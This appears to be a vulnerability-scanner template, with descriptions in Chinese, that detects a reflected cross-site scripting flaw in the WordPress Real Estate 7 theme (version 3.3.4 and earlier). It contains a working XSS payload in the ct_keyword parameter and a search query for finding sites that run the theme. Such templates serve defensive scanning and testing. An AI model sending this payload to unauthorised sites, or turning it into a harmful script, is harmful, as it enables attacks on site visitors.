id: wp-real-estate-xss

info:
  name: WordPress Real Estate 7 Theme <= 3.3.4 - 跨站脚本漏洞
  author: Harsh
  severity: medium
  description: |
    该模板用于检测 WordPress Real Estate 7 Theme <= 3.3.4 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/?ct_keyword=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&ct_city=0&ct_s...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://www.exploitalert.com/view-details.html?id=39344
    - https://packetstormsecurity.com/files/171186/WordPress-Real-Estate-7-Theme-3.3.4-Cross-Site-Scripting.html
    - https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    cpe: cpe:2.3:a:contempothemes:real_estate_7:*:*:*:*:wordpress:*:*:*
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/themes/realestate-7/"
    product: real_estate_7
    vendor: contempothemes
  tags: packetstorm,wordpress,wp-theme,xss,realestate,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?ct_keyword=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&ct_city=0&ct_state=0&ct_zipcode=0&search-listings=true&ct_property_type=0&ct_beds=0&ct_baths=0&ct_price_from&ct_price_to"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "<img src=x onerror=prompt(document.domain)>")'
          - 'contains(body, "/wp-content/themes/realestate-7/")'
        condition: and
